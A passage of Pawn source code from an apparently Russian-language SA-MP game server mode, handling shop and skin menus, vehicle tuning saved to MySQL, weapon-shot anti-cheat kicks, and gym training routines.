				InterpolateCameraLookAt(playerid, 1367.391357, -2370.494384, 101.552726, 1430.618041, -2276.692382, 18.953020, 5000);
			}
			else
			{
			    InterpolateCameraPos(playerid, 1747.159057, 1399.743041, 31.417682, 1705.325805, 1476.537231, 14.254146, 5000);
				InterpolateCameraLookAt(playerid, 1743.991821, 1403.451538, 30.315038, 1701.705444, 1473.101074, 13.961931, 5000);
			}
            return 1;
        }
   		if(GetPVarInt(playerid,"InMebel"))
        {
			SetPVarInt(playerid,"MebelRaz",GetPVarInt(playerid,"MebelRaz")+1);
			if(GetPVarInt(playerid,"MebelRaz") > 10) SetPVarInt(playerid,"MebelRaz",0);
			DeletePVar(playerid,"MebelCheck");
			SetMebel(playerid);
			return true;
        }
        if(GetPVarInt(playerid,"Shkaf"))
        {
            SetPVarInt(playerid,"ShkafRaz",GetPVarInt(playerid,"ShkafRaz")+1);
			if(GetPVarInt(playerid,"ShkafRaz") > GetPVarInt(playerid,"MaxSkins")-1) SetPVarInt(playerid,"ShkafRaz",0);
			SetPlayerSkin(playerid,ListNick[playerid][GetPVarInt(playerid,"ShkafRaz")]);
			format(str,sizeof(str),"ID: %d", ListNick[playerid][GetPVarInt(playerid,"ShkafRaz")]);
			PlayerTextDrawSetString(playerid,ObjectBuyP[1][playerid],str);
            return true;
        }
        if(GetPVarInt(playerid,"BuySkin"))
        {
            SetPVarInt(playerid,"SelectSkin",GetPVarInt(playerid,"SelectSkin")+1);
			new maxskin = (PlayerInfo[playerid][pSex] == 1) ? (sizeof(MenSkin)-1) : (sizeof(WomenSkin)-1);
			if(GetPVarInt(playerid,"SelectSkin") > maxskin) SetPVarInt(playerid,"SelectSkin",0);
			SetPlayerSkin(playerid,MenSkin[GetPVarInt(playerid,"SelectSkin")][1]);
			format(string1, sizeof(string1), fmt_str1, MenSkin[GetPVarInt(playerid,"SelectSkin")][0]);
			PlayerTextDrawSetString(playerid,ObjectBuyP[2][playerid],string1);
			return 1;
        }
        if(GetPVarInt(playerid,"BuyAmmo"))
		{
		    SetPVarInt(playerid,"SelectAmmo",GetPVarInt(playerid,"SelectAmmo")+1);
		    if(GetPVarInt(playerid,"SelectAmmo") > 6) SetPVarInt(playerid,"SelectAmmo",0);
		    SetAmmo(playerid);
		    return 1;

		}
        SetPVarInt(playerid,"ACS1",GetPVarInt(playerid,"ACS1")+1);
        if(GetPVarInt(playerid,"ACS1") > 14) SetPVarInt(playerid,"ACS1",1);
        DeletePVar(playerid,"ACS2");
      //  GiveItem(playerid,ItemsId[GetPVarInt(playerid,"ACS1")-1][0]);
		// 2 7 10
		static const fmt_str21[] = "%s 1";
		new stri2ng1[sizeof(fmt_str21)+3+20];
		format(stri2ng1, sizeof(stri2ng1), fmt_str21, ItemsName[GetPVarInt(playerid,"ACS1")-1]);
		PlayerTextDrawSetString(playerid,ObjectBuyP[0][playerid],stri2ng1);
		
		switch(GetPVarInt(playerid,"ACS1")-1)
		{
			case 0,2,7,10: format(str,sizeof(str),"%s", ItemsName[GetPVarInt(playerid,"ACS1")-1]);
			default: format(str,sizeof(str),"%ss", ItemsName[GetPVarInt(playerid,"ACS1")-1]);
		}
		PlayerTextDrawSetString(playerid,ObjectBuyP[1][playerid],str);
		
		format(string1, sizeof(string1), fmt_str1, ItemsCost[GetPVarInt(playerid,"ACS1")-1][GetPVarInt(playerid,"ACS2")]);
		PlayerTextDrawSetString(playerid,ObjectBuyP[2][playerid],string1);
        SetAcs(playerid);
        GiveItem(playerid,ItemsId[GetPVarInt(playerid,"ACS1")-1][0]);
        new Float:x,Float:y,Float:z;
		new Float:x1,Float:y1,Float:z1;
		GetPlayerCameraPos(playerid,x,y,z);
		GetPlayerCameraLookAt(playerid,x1,y1,z1);
        switch(GetPVarInt(playerid,"ACS1"))
		{
		    case 11:
			{
			    InterpolateCameraPos(playerid, x,y,z, -0.447082,10.376569,1996.585693, 1000);
				InterpolateCameraLookAt(playerid, x1,y1,z1, -1.195245,10.926286,1996.214111, 1000);
			}
			case 12:
			{
			    InterpolateCameraPos(playerid, x,y,z, -1.175766,12.176349,1996.884521, 1000);
				InterpolateCameraLookAt(playerid, x1,y1,z1, -1.457972,11.270668,1996.568115, 1000);
			}
			case 13:
			{
			    InterpolateCameraPos(playerid, x,y,z, -0.243667,11.121191,1996.784912, 1000);
				InterpolateCameraLookAt(playerid, x1,y1,z1, -1.236707,11.100506,1996.668945, 1000);
			}
            default:
		    {
				SetPlayerCameraPos(playerid,-0.243667,11.121191,1996.784912);
				SetPlayerCameraLookAt(playerid,-1.236707,11.100506,1996.668945);
		    }
		}
      
    }
    if(clickedid == ObjectBuy[12])
    {
    	new str[25];
   	 	static const fmt_str1[] = "$%i";
		new string1[sizeof(fmt_str1)+10];
        if(SpawnReg[playerid])
        {
            SetPVarInt(playerid,"Gorod",GetPVarInt(playerid,"Gorod")-1);
			if(GetPVarInt(playerid,"Gorod") < 0) SetPVarInt(playerid,"Gorod",1);
			DeletePVar(playerid,"SpawnVib");
            PlayerTextDrawSetString(playerid,ObjectBuyP[1][playerid],(GetPVarInt(playerid,"Gorod")) ? ("Los Santos"):("Las Venturas"));
            PlayerTextDrawSetString(playerid,ObjectBuyP[0][playerid],"PLANE");
            SetPlayerVirtualWorld(playerid,0);
            if(GetPVarInt(playerid,"Gorod"))
            {
				InterpolateCameraPos(playerid, 1364.583374, -2373.431152, 104.466720, 1426.709960, -2274.038818, 20.591976, 5000);
				InterpolateCameraLookAt(playerid, 1367.391357, -2370.494384, 101.552726, 1430.618041, -2276.692382, 18.953020, 5000);
			}
			else
			{
			    InterpolateCameraPos(playerid, 1747.159057, 1399.743041, 31.417682, 1705.325805, 1476.537231, 14.254146, 5000);
				InterpolateCameraLookAt(playerid, 1743.991821, 1403.451538, 30.315038, 1701.705444, 1473.101074, 13.961931, 5000);
			}

            return 1;
        }
        if(GetPVarInt(playerid,"BuySkin"))
        {
            SetPVarInt(playerid,"SelectSkin",GetPVarInt(playerid,"SelectSkin")-1);
			new maxskin = (PlayerInfo[playerid][pSex] == 1) ? (sizeof(MenSkin)-1) : (sizeof(WomenSkin)-1);
			if(GetPVarInt(playerid,"SelectSkin") < 0) SetPVarInt(playerid,"SelectSkin",maxskin);
			SetPlayerSkin(playerid,MenSkin[GetPVarInt(playerid,"SelectSkin")][1]);
			format(string1, sizeof(string1), fmt_str1, MenSkin[GetPVarInt(playerid,"SelectSkin")][0]);
			PlayerTextDrawSetString(playerid,ObjectBuyP[2][playerid],string1);
			return 1;
        }
		if(GetPVarInt(playerid,"BuyAmmo"))
		{
		    SetPVarInt(playerid,"SelectAmmo",GetPVarInt(playerid,"SelectAmmo")-1);
		    if(GetPVarInt(playerid,"SelectAmmo") < 0) SetPVarInt(playerid,"SelectAmmo",6);
		    
		    SetAmmo(playerid);
		    return 1;

		}
        if(GetPVarInt(playerid,"InMebel"))
        {
			SetPVarInt(playerid,"MebelRaz",GetPVarInt(playerid,"MebelRaz")-1);
			if(GetPVarInt(playerid,"MebelRaz") < 0) SetPVarInt(playerid,"MebelRaz",10);
			DeletePVar(playerid,"MebelCheck");
			SetMebel(playerid);
			return true;
        }
        if(GetPVarInt(playerid,"Shkaf"))
        {
            SetPVarInt(playerid,"ShkafRaz",GetPVarInt(playerid,"ShkafRaz")-1);
			if(GetPVarInt(playerid,"ShkafRaz") < 0) SetPVarInt(playerid,"ShkafRaz",GetPVarInt(playerid,"MaxSkins")-1);
			SetPlayerSkin(playerid,ListNick[playerid][GetPVarInt(playerid,"ShkafRaz")]);
			format(str,sizeof(str),"ID: %d", ListNick[playerid][GetPVarInt(playerid,"ShkafRaz")]);
			PlayerTextDrawSetString(playerid,ObjectBuyP[1][playerid],str);
            return true;
        }
        SetPVarInt(playerid,"ACS1",GetPVarInt(playerid,"ACS1")-1);
        if(GetPVarInt(playerid,"ACS1") < 1) SetPVarInt(playerid,"ACS1",14);
        DeletePVar(playerid,"ACS2");
		static const fmt_str21[] = "%s 1";
		new stri2ng1[sizeof(fmt_str21)+3+20];
		format(stri2ng1, sizeof(stri2ng1), fmt_str21, ItemsName[GetPVarInt(playerid,"ACS1")-1]);
		PlayerTextDrawSetString(playerid,ObjectBuyP[0][playerid],stri2ng1);
		
		switch(GetPVarInt(playerid,"ACS1")-1)
		{
			case 0,2,7,10: format(str,sizeof(str),"%s", ItemsName[GetPVarInt(playerid,"ACS1")-1]);
			default: format(str,sizeof(str),"%ss", ItemsName[GetPVarInt(playerid,"ACS1")-1]);
		}
		PlayerTextDrawSetString(playerid,ObjectBuyP[1][playerid],str);

	
		format(string1, sizeof(string1), fmt_str1, ItemsCost[GetPVarInt(playerid,"ACS1")-1][GetPVarInt(playerid,"ACS2")]);
		PlayerTextDrawSetString(playerid,ObjectBuyP[2][playerid],string1);
      	SetAcs(playerid);
      	GiveItem(playerid,ItemsId[GetPVarInt(playerid,"ACS1")-1][0]);
      	new Float:x,Float:y,Float:z;
		new Float:x1,Float:y1,Float:z1;
		GetPlayerCameraPos(playerid,x,y,z);
		GetPlayerCameraLookAt(playerid,x1,y1,z1);
      	switch(GetPVarInt(playerid,"ACS1"))
		{
		    case 11:
			{
			    InterpolateCameraPos(playerid, x,y,z, -0.447082,10.376569,1996.585693, 1000);
				InterpolateCameraLookAt(playerid, x1,y1,z1, -1.195245,10.926286,1996.214111, 1000);
			}
			case 12:
			{
			    InterpolateCameraPos(playerid, x,y,z, -1.175766,12.176349,1996.884521, 1000);
				InterpolateCameraLookAt(playerid, x1,y1,z1, -1.457972,11.270668,1996.568115, 1000);
			}
			case 13:
			{
			    InterpolateCameraPos(playerid, x,y,z, -0.243667,11.121191,1996.784912, 1000);
				InterpolateCameraLookAt(playerid, x1,y1,z1, -1.236707,11.100506,1996.668945, 1000);
			}
            default:
		    {
				SetPlayerCameraPos(playerid,-0.243667,11.121191,1996.784912);
				SetPlayerCameraLookAt(playerid,-1.236707,11.100506,1996.668945);
		    }
		}
    }
	return 1;

}

stock SaveVehicleTuning(playerid)
{
	new i = GetPlayerVehicleID(playerid);
	new kek = 0;
	for(new i1 = 1; i1 <= TOTALV; i1++)
	{
	    if(VInfo[i1][vcar] == INVALID_VEHICLE_ID) continue;
		if(i == VInfo[i1][vcar]) kek = i1;
	}
	query = "";
	VInfo[kek][vtuning][0]=GetVehicleComponentInSlot(i, CARMODTYPE_SPOILER);
	VInfo[kek][vtuning][1]=GetVehicleComponentInSlot(i, CARMODTYPE_HOOD);
	VInfo[kek][vtuning][2]=GetVehicleComponentInSlot(i, CARMODTYPE_ROOF);
	VInfo[kek][vtuning][3]=GetVehicleComponentInSlot(i, CARMODTYPE_SIDESKIRT);
	VInfo[kek][vtuning][4]=GetVehicleComponentInSlot(i, CARMODTYPE_LAMPS);
	VInfo[kek][vtuning][5]=GetVehicleComponentInSlot(i, CARMODTYPE_NITRO);
	VInfo[kek][vtuning][6]=GetVehicleComponentInSlot(i, CARMODTYPE_EXHAUST);
	VInfo[kek][vtuning][7]=GetVehicleComponentInSlot(i, CARMODTYPE_WHEELS);
	VInfo[kek][vtuning][8]=GetVehicleComponentInSlot(i, CARMODTYPE_STEREO);
	VInfo[kek][vtuning][9]=GetVehicleComponentInSlot(i, CARMODTYPE_HYDRAULICS);
	VInfo[kek][vtuning][10]=GetVehicleComponentInSlot(i, CARMODTYPE_FRONT_BUMPER);
	VInfo[kek][vtuning][11]=GetVehicleComponentInSlot(i, CARMODTYPE_REAR_BUMPER);
	VInfo[kek][vtuning][12]=GetVehicleComponentInSlot(i, CARMODTYPE_VENT_RIGHT);
	VInfo[kek][vtuning][13]=GetVehicleComponentInSlot(i, CARMODTYPE_VENT_LEFT);
	format(VInfo[kek][vtunings], 100, "%d,%d,%d,%d,%d,%d,%d,%d,%d,%d,%d,%d,%d,%d",
	VInfo[kek][vtuning][0],VInfo[kek][vtuning][1],VInfo[kek][vtuning][2],
	VInfo[kek][vtuning][3],VInfo[kek][vtuning][4],VInfo[kek][vtuning][5],
	VInfo[kek][vtuning][6],VInfo[kek][vtuning][7],VInfo[kek][vtuning][8],
	VInfo[kek][vtuning][9],VInfo[kek][vtuning][10],VInfo[kek][vtuning][11],
	VInfo[kek][vtuning][12],VInfo[kek][vtuning][13]);
 	format(query,sizeof(query),"UPDATE `veh` SET `tuning` = '%s' WHERE id = '%d' LIMIT 1",VInfo[kek][vtunings],kek);
	mysql_tquery(mysql,query);
}
stock SetTuning(vehicleid,i)
{
	if(VInfo[i][vtuning][0]!=0) AddVehicleComponent(vehicleid, VInfo[i][vtuning][0]);
	if(VInfo[i][vtuning][1]!=0) AddVehicleComponent(vehicleid, VInfo[i][vtuning][1]);
	if(VInfo[i][vtuning][2]!=0) AddVehicleComponent(vehicleid, VInfo[i][vtuning][2]);
	if(VInfo[i][vtuning][3]!=0) AddVehicleComponent(vehicleid, VInfo[i][vtuning][3]);
	if(VInfo[i][vtuning][4]!=0) AddVehicleComponent(vehicleid, VInfo[i][vtuning][4]);
	if(VInfo[i][vtuning][5]!=0) AddVehicleComponent(vehicleid, VInfo[i][vtuning][5]);
	if(VInfo[i][vtuning][6]!=0) AddVehicleComponent(vehicleid, VInfo[i][vtuning][6]);
	if(VInfo[i][vtuning][7]!=0) AddVehicleComponent(vehicleid, VInfo[i][vtuning][7]);
	if(VInfo[i][vtuning][8]!=0) AddVehicleComponent(vehicleid, VInfo[i][vtuning][8]);
	if(VInfo[i][vtuning][9]!=0) AddVehicleComponent(vehicleid, VInfo[i][vtuning][9]);
	if(VInfo[i][vtuning][10]!=0) AddVehicleComponent(vehicleid, VInfo[i][vtuning][10]);
	if(VInfo[i][vtuning][11]!=0) AddVehicleComponent(vehicleid, VInfo[i][vtuning][11]);
	if(VInfo[i][vtuning][12]!=0) AddVehicleComponent(vehicleid, VInfo[i][vtuning][12]);
	if(VInfo[i][vtuning][13]!=0) AddVehicleComponent(vehicleid,VInfo[i][vtuning][13]);
	ChangeVehicleColor(vehicleid, VInfo[i][vcolor1], VInfo[i][vcolor2]);
	if(VInfo[i][vsvet] != 5) ChangeVehiclePaintjob(vehicleid,VInfo[i][vsvet]);
}
public OnPlayerDamage(&playerid, &Float:amount, &issuerid, &weapon, &bodypart)
{
    SetPVarInt(playerid,"DrugsDamag",gettime() + 30);
	
	
    
    
	if(issuerid != INVALID_PLAYER_ID && playerid != INVALID_PLAYER_ID)
	{
	    if(!IsPlayerStreamedIn(playerid,issuerid))
	    {
	        if(!GetPVarInt(playerid,"Cheat"))
			{
			 	SaveAccount(playerid),CheatKick(playerid,17);
			}
	    }
	    if(PlayerInfo[playerid][pDamage])
		{
		    new _damage = floatround(Float:amount, floatround_ceil);
			static const fmt_strin1g[] = "DAMAGE: ~r~-%d HP";
			new strin1g[sizeof(fmt_strin1g)-2+5];
			format(strin1g, sizeof(strin1g), fmt_strin1g, _damage);
			PlayerTextDrawSetString(issuerid, PointsTD[issuerid][0], strin1g);
			SetPVarInt(issuerid,"DamageTimer",GetTickCount()+1000);
		}
    }
    if(IsAGang(playerid) || IsAMafia(playerid))
	{
	    
		new playerfrac = PlayerInfo[playerid][pMember]-6;
		if(CaptInfo[playerfrac][capture])
		{
		    if(PlayerInfo[issuerid][pMember] == CaptInfo[playerfrac][capture]) PlayerInfo[playerid][pCrimeStats][C_AM] += floatround(amount);
		}
	}
	if(GetPVarInt(playerid,"InDog") && GetPVarInt(issuerid,"InDog"))
	{
	    if(DogVed == issuerid)
	    {
		    if(playerid == DogVedPred) SendClientMessage(issuerid,CGREY,"Нельзя салить предыдущего ведущего");
		    else
		    {
		        DestroyDynamic3DTextLabel(DogText);
				DogText = CreateDynamic3DTextLabel("Ведущий",0xFF0000FF,0.0,0.0,0.5,5.0,playerid,INVALID_VEHICLE_ID,1, 11);
				DogVed = playerid;
				DogVedPred = issuerid;
				GameTextForPlayer(playerid, "~r~YOU ARE LEADING", 5000, 4);
			}
		}
		SetHealth(playerid,100);
	}

	return 1;
}

function Uncuff1(playerid) if(GetPVarInt(playerid,"CopCar") == 0) TogglePlayerControllable(playerid, 1);

function Uncuff(playerid)
{
 	SetPlayerSpecialAction(playerid,0);
 	DeletePVar(playerid,"TimeCuff");
 	if(IsPlayerAttachedObjectSlotUsed(playerid, 2)) RemovePlayerAttachedObject(playerid, 2);
}
stock sparam(dest[], maxSize = sizeof(dest), const source[], delimiter = ' ', substrIndex = 0, withRest = 0)
	{
	dest[0] = 0; // очистим строку назначения
	for ( new cur, pre, i = -1; ; cur++ ) // пробежимся по каждому символу в строке source
	{
		if ( source[cur] == 0 ) // если текущий символ в source - это символ конца строки
		{
			if ( ++i == substrIndex ) // если индекс текущей подстроки и есть sourceIndex
			// скопируем в dest нужную подстроку из source
			strmid( dest, source, pre, ( withRest ? strlen(source) : cur ), maxSize );
			goto sparam_end;
		}
		if ( source[cur] == delimiter ) // если текущий символ в source - это символ для разделения строки
		{
			if ( ++i == substrIndex ) // если индекс текущей подстроки и есть sourceIndex
			{
				// скопируем в dest нужную подстроку из source
				strmid( dest, source, pre, ( withRest ? strlen(source) : cur ), maxSize );
				goto sparam_end;
			}
			pre = cur + 1;
		}
	}
	sparam_end:
	return; // завершим работу функции
}

public OnPlayerWeaponShot(playerid, weaponid, hittype, hitid, Float:fX, Float:fY, Float:fZ)
{
	if(weaponid == 38 && GetPVarInt(playerid,"Cheat") == 0)
	{
	    ResetPlayerWeapons(playerid);
	    SaveAccount(playerid),CheatKick(playerid,12);
	    return 0;
	}
 
	if((weaponid != GunInfo[playerid][pWeapon][Slot(weaponid)])
	&&(GetTickCount() > gun__ignore_tick[playerid])
	&& (GetPVarInt(playerid,"Cheat") == 0))
	{
		SaveAccount(playerid),CheatKick(playerid,9);
	}
	if(weaponid > 15 && weaponid < 38)
	{
	    if(GunInfo[playerid][pAmmo][Slot(weaponid)] > 0) GunInfo[playerid][pAmmo][Slot(weaponid)]--;
	    else
		{
		    GunInfo[playerid][pAmmo][Slot(weaponid)] = 0;
			GunInfo[playerid][pWeapon][Slot(weaponid)] = 0;
		}
	}
	new Float:pos[3];
    GetPlayerCameraPos(playerid, pos[0], pos[1], pos[2]);
    if(floatcmp(pos[0], 7000.0) == 1 || floatcmp(pos[1], 7000.0) == 1 || floatcmp(pos[2], 7000.0) == 1 ||
    floatcmp(pos[0], -7000.0) == -1 || floatcmp(pos[1], -7000.0) == -1 || floatcmp(pos[2], -7000.0) == -1)
    {
        if(GetPVarInt(playerid,"Cheat") == 0)
        {
			SaveAccount(playerid),CheatKick(playerid,13);
			return 0;
		}
    }
 	bullet__fire1[playerid] = GetPlayerAmmo(playerid);
    if(bullet__fire1[playerid] == bullet__fire2[playerid])
	{
		if(gun__ignore[playerid] > 5) Kick(playerid, FIX_FUNCTION, 1200);
        gun__ignore[playerid] += 1;
    }
	else
	{
	    bullet__fire2[playerid] = bullet__fire1[playerid];
	    gun__ignore[playerid] = 0;
    }
	switch(hittype)
	{
		case 1:
		{
  			if(!(-20.0 <= fX <= 20.0) || !(-20.0 <= fY <= 20.0) || !(-20.0 <= fZ <= 20.0))
			{
			    if(GetPVarInt(playerid,"Cheat") == 0)
			    {
				    SaveAccount(playerid),CheatKick(playerid,14);
					return 0;
				}
			}
			if(GetPVarInt(hitid, "AFK_Time") > 1) return false;
			if(weaponid == 23 && GetPVarInt(playerid,"Tazer"))
			{
	            static const fmt_string[] = "%s оглушил игрока %s";
				new str[sizeof(fmt_string)+MAX_PLAYER_NAME+32];
				format(str, sizeof(str), fmt_string,PlayerInfo[playerid][pSendername],PlayerInfo[hitid][pSendername]);
				ProxDetectorNew(playerid,30.0,COLOR_PURPLE,str);
				TogglePlayerControllable(hitid, 0);
				SetPlayerChatBubble(playerid, "оглушил игрока", COLOR_PURPLE, 30.0, 7000);
				SetTimerEx("Uncuff1",30000,false,"i",hitid);
				DeletePVar(playerid,"Tazer");
			}
			if(InGameGG && GetPVarInt(playerid,"KomGG"))
			{
				if(GetPVarInt(hitid,"AntiSK") > gettime())
				{
				    if(IsPlayerInDynamicArea(hitid,GetPVarInt(hitid,"AreaSK")))
					{
					    SendClientMessage(playerid,CLIGHTRED,"SpawnKill запрещен!");
				 		return 0;
					}
				}
			}
			if(GetPVarInt(playerid,"AntiSK") > gettime()) DeletePVar(playerid,"AntiSK");
			new Float:_pos[3];
		    GetPlayerLastShotVectors(playerid, _pos[0], _pos[0], _pos[0],  _pos[0], _pos[1], _pos[2]);
		    if((GetPlayerDistanceFromPoint(hitid,  _pos[0], _pos[1], _pos[2]) >= 5.0)
			&&(GetPlayerSurfingVehicleID(hitid) == INVALID_VEHICLE_ID)
			&&(GetPlayerSurfingVehicleID(playerid) == INVALID_VEHICLE_ID)
			&&(!IsPlayerInAnyVehicle(hitid))
			&&(!IsPlayerInAnyVehicle(playerid))
			&& (GetPVarInt(playerid,"Cheat") == 0))
			{
			    SaveAccount(playerid),CheatKick(playerid,15);
				return 0;
			}
		}
	}
	return true;
}
stock CheatKick(playerid,code)
{
	if(cheatk[code] == 1) return true;
	SetPVarInt(playerid,"Cheat",1);
	SetPVarInt(playerid,"Kick1",1);
	static const fmt_string1[] = "Вы кикнуты по подозрению в читерстве: #%i";
	new str1[sizeof(fmt_string1)+7];
	format(str1, sizeof(str1), fmt_string1,code);
	SendClientMessage(playerid,CRED,str1);
	SendClientMessage(playerid,CRED,"Если произошла ошибка, скажите об этом администрации ");
	static const fmt_string[] = "[A] %s кикнут по подозрению в читерстве (#%i)";
	new str[sizeof(fmt_string)+32+7];
	format(str, sizeof(str), fmt_string,PlayerInfo[playerid][pSendername],code);
	SendAdminMessage(CBLUE,str);
	return Kick(playerid, FIX_FUNCTION, 1200);
}

stock GetOnline(frac)
{
	new kek = 0;
	for(new i = 0; i < MAX_PLAYERS; i++)
	{
	    if(!IsPlayerConnected(i) || PlayerLogged[i] == false) continue;
		if(PlayerInfo[i][pMember] == frac) kek++;
	}
	return kek;
}
public OnPlayerSelectObject(playerid, type, objectid, modelid, Float:fX, Float:fY, Float:fZ)
{
	ShowPlayerDialog(playerid,147,DIALOG_STYLE_MSGBOX,"Что сделать?","{FFFFFF}Что сделать?","Редактировать","Удалить");
	SetPVarInt(playerid,"Select",objectid);
	return 1;
}

stock GetBotProd(playerid)
{
	new kek = 0;
	if(IsPlayerInRangeOfPoint(playerid,3,-636.0065,1447.8339,13.6827)) kek = 0;
	else kek = 1;
	return kek;
}
stock BizMenu(playerid)
{
	new kek[40],text[30];
	if(strfind(BizInfo[GetPVarInt(playerid,"PlayerBiz")][bMen],"None",true) != -1) kek = "Назначить управляющего";
	else format(kek,sizeof(kek),"Уволить %s",BizInfo[GetPVarInt(playerid,"PlayerBiz")][bMen]);
	switch(BizInfo[GetPVarInt(playerid,"PlayerBiz")][bType])
	{
		case 9: text = "Панель машин";
		default: text = "Заказать продукты";
	}
	
	query = "{FFFFFF}1 | Открыть/Закрыть бизнес\n2 | Установить цену за вход\n{F85A5A}3 | Продать бизнес государству\n{F85A5A}4 | Продать бизнес игроку\n{F85A5A}5 | Обменять бизнесом с игроком{ffffff}\n6 | Изменить цены";
	if(BizInfo[GetPVarInt(playerid,"PlayerBiz")][bType] != 12 && BizInfo[GetPVarInt(playerid,"PlayerBiz")][bType] != 13)
	{
		static const fmt_str1[] = "\n7 | %s\n8 | %s\n9 | Добавить звук\n10 | Улучшения";
		new string2[sizeof(fmt_str1)+100];
		format(string2, sizeof(string2), fmt_str1,kek,text);
		strcat(query,string2);
	}
	ShowPlayerDialog(playerid,71,DIALOG_STYLE_LIST,"Управление бизнесом",query,"Далее","Назад");
	return true;
}
stock GetTune(ch,proc) return (proc*ch)/100;
stock GetProcent(ch,vip = 0)
{
	new mam;
	if(vip) mam= (90*ch)/100;
	else mam=  (70*ch)/100;
	return mam;
}
stock GetProcent1(ch) return (30*ch)/100;
/*public OnPlayerTakeDamage(playerid, issuerid, Float: amount, weaponid, bodypart)
{
    return 1;
}*/
public OnVehicleDamageStatusUpdate(vehicleid, playerid)
{
	return 1;
}


stock SetSkin(playerid)
{
    switch(PlayerInfo[playerid][pMember])
	{
	    case 0:
	    {
			SetPlayerSkin(playerid,PlayerInfo[playerid][pModel]);
			SetPlayerColor(playerid, 0xFFFFFF20);
	    }
	    case 6..10,12..14,16:
		{
		//	SetPlayerSkin(playerid,PlayerInfo[playerid][pFracSkin]);
			SetColor(playerid);
			SetPlayerSkin(playerid,(PlayerInfo[playerid][pSex] == 1)? (FracInfo[PlayerInfo[playerid][pMember]][fMSkin][PlayerInfo[playerid][pRank]-1]) : (FracInfo[PlayerInfo[playerid][pMember]][fWSkin]));
		}
		default:
		{
		    switch(PlayerInfo[playerid][pWork])
			{
			    case 0:
			    {
					//SetPlayerSkin(playerid,PlayerInfo[playerid][pModel]);
					SetPlayerColor(playerid, 0xFFFFFF20);
			    }
			    case 1:
			    {
    				if(PlayerInfo[playerid][pMember] == F_LVPD || PlayerInfo[playerid][pMember] == F_ARMY)
					{
					    new Float:arm;
						GetPlayerArmour(GetPVarInt(playerid,"ID1"),arm);
						//if(arm > 0) PlayerArmour(GetPVarInt(playerid,"ID1"));
					}
			    //	SetPlayerSkin(playerid,PlayerInfo[playerid][pFracSkin]);
			        SetPlayerSkin(playerid,(PlayerInfo[playerid][pSex] == 1)? (FracInfo[PlayerInfo[playerid][pMember]][fMSkin][PlayerInfo[playerid][pRank]-1]) : (FracInfo[PlayerInfo[playerid][pMember]][fWSkin]));
					SetColor(playerid);
			    }
			}
		}
	}
}

	

EndKach(playerid,number)
{
    SetCameraBehindPlayer(playerid);
	TogglePlayerControllable(playerid,true);
	Trenag[playerid]=0;
//	PlayerTextDrawHide(playerid,EXITTEXT[playerid]);
    PlayerTextDrawDestroy(playerid,InfoText[playerid]);
	for(new gSL; gSL < 3; gSL++) TextDrawHideForPlayer(playerid, PressH[gSL]);
	switch(number)
	{
		case 1,5:
		{
			usetre[(GetPlayerVirtualWorld(playerid) == 1) ? (0) : (4)]=false; ApplyAnimation(playerid,"benchpress","gym_bp_getoff",4.1,0,0,0,1,1,1);
			SetTimerEx("ClearAnim",6000,false,"i",playerid);
			KTrenag[(GetPlayerVirtualWorld(playerid) == 1) ? (0) : (2)] = CreateDynamicObject(2913, 774.354431,1.900340,1000.605163, 90.000038,0.999999,-0.900000,GetPlayerVirtualWorld(playerid));
		}
		case 2,6:
		{
			usetre[(GetPlayerVirtualWorld(playerid) == 1) ? (1) : (5)]=false;
			ApplyAnimation( playerid, "GYMNASIUM", "gym_bike_getoff", 4.1, 0, 0, 0, 0, 0 );
			SetPVarInt(playerid,"Kach",1);
			printf("1 | %d",GetPVarInt(playerid,"Kach"));
			SetTimerEx("ClearAnim",2000,false,"i",playerid);
			
		}
		case 3,7:
		{
			usetre[(GetPlayerVirtualWorld(playerid) == 1) ? (2) : (6)]=false;
			ApplyAnimation( playerid, "Freeweights", "gym_free_putdown", 4.1, 0, 0, 0, 1, 0 );
			SetTimerEx("ClearAnim",3000,false,"i",playerid);
			KTrenag[(GetPlayerVirtualWorld(playerid) == 1) ? (1) : (3)] = CreateDynamicObject(2915, 771.865661,5.590106,999.889953, 0.000000,-1.000000,91.299919,GetPlayerVirtualWorld(playerid));
		}
		case 4,8:
		{
			usetre[(GetPlayerVirtualWorld(playerid) == 1) ? (3) : (7)]=false;
			ApplyAnimation( playerid, "GYMNASIUM", "gym_tread_getoff", 4.1, 0, 0, 0, 0, 0 );
			SetPVarInt(playerid,"Kach",1);
			printf("1 | %d",GetPVarInt(playerid,"Kach"));
			SetTimerEx("ClearAnim",3000,false,"i",playerid);
		}
	}
   	return 1;
}
KolRaz(i)
{
    new string[30],raz,op;
	switch(Trenag[i])
	{
		case 1: op = PlayerInfo[i][pShtanga],raz = 15*PlayerInfo[i][pSkillT];
		case 2: op = PlayerInfo[i][pVelo],raz = 40*PlayerInfo[i][pSkillT];
		case 3: op = PlayerInfo[i][pGiri],raz = 20*PlayerInfo[i][pSkillT];
		case 4: op = PlayerInfo[i][pBeg],raz = 50*PlayerInfo[i][pSkillT];
	}
	format(string,sizeof(string),"STEP %d OF %d",op,raz);
	PlayerTextDrawSetString(i,InfoText[i],string);
	return 1;//PlayerTextDrawSetString(i,EXITTEXT[i],string);
}
stock CheckSkill(i)
{
	if(PlayerInfo[i][pShtanga] >= 15*PlayerInfo[i][pSkillT] && PlayerInfo[i][pVelo] >= 40*PlayerInfo[i][pSkillT] &&
	PlayerInfo[i][pGiri] >= 20*PlayerInfo[i][pSkillT] && PlayerInfo[i][pBeg] >= 50*PlayerInfo[i][pSkillT] && PlayerInfo[i][pUdar] >= 30*PlayerInfo[i][pSkillT] && PlayerInfo[i][pSkillT] < 10)
	{
		PlayerInfo[i][pShtanga]=0;
		PlayerInfo[i][pVelo]=0;
		PlayerInfo[i][pGiri]=0;
		PlayerInfo[i][pBeg]=0;
		PlayerInfo[i][pSkillT]++;
		SendClientMessage(i,CYELLOW,"Вы подняли свой уровень силовой подготовки!");
		if(PlayerInfo[i][pZavisimost] > 5)
		{
			PlayerInfo[i][pZavisimost] -= 5;
			static const fmt_strin3g1[] = "Ваша наркозависимость: %d";
			new str3[sizeof(fmt_strin3g1)+MAX_PLAYER_NAME];
			format(str3, sizeof(str3), fmt_strin3g1,PlayerInfo[i][pZavisimost]);
			SendClientMessage(i,COLOR_PURPLE,str3);
		}
		else PlayerInfo[i][pZavisimost] = 0;
	}
}
stock SendAd(color,str[])
{
	for(new i = 0; i < MAX_PLAYERS; i++)
	{
        if(!IsPlayerConnected(i) || PlayerLogged[i] == false || GetPVarInt(i,"ChatAD")) continue;
        SendClientMessage(i,color,str);
	}
}
function Adgo(playerid,play)
{
	if(PlayerInfo[playerid][pAd] > 1)
	{
		static const fmt_string[] = "Обьявление: %s | Прислал: %s. Тел.: %i";
